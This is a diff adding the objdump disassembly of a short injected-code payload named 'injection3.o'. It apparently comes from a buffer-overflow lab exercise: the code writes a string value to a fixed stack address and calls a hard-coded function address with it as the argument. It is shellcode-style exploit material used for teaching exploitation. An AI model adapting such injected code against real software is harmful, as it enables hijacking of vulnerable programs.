@@ -1,0 +1,17 @@
+
+injection3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 83 ec 28          	sub    $0x28,%rsp
+   4:	48 b8 36 34 33 65 31 	movabs $0x6431623165333436,%rax
+   b:	62 31 64 
+   e:	c6 04 25 7a 04 67 55 	movb   $0x0,0x5567047a
+  15:	00 
+  16:	48 89 04 25 72 04 67 	mov    %rax,0x55670472
+  1d:	55 
+  1e:	48 c7 c7 72 04 67 55 	mov    $0x55670472,%rdi
+  25:	48 c7 c0 c4 1a 40 00 	mov    $0x401ac4,%rax
+  2c:	ff d0                	call   *%rax
